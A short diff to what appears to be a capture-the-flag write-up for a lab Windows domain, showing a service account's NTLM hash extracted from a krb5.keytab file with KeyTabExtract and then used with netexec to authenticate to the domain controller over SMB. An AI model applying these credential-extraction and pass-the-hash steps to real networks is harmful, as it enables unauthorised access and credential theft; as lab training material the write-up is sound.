@@ -782,7 +782,7 @@ root@web:~#
 
 I now have a more stable and persistent connection on the root user over SSH
 
-# Initial access on the domain
+# Initial access on the domain as the `web$` user
 
 https://github.com/sosdave/KeyTabExtract
 
@@ -807,6 +807,14 @@ python3 keytabextract.py krb5.keytab
 ```
 
 I now have a user i can use to authenticate to the domain
+
+```python
+nxc smb dc01.fries.htb -u 'web$' -H '61e3599900d7a81c373bcbaaa755bdb2'
+SMB         10.129.244.72   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:fries.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.244.72   445    DC01             [+] fries.htb\web$:61e3599900d7a81c373bcbaaa755bdb2
+```
+
+Now i can do some domain enumeration
 
 
 
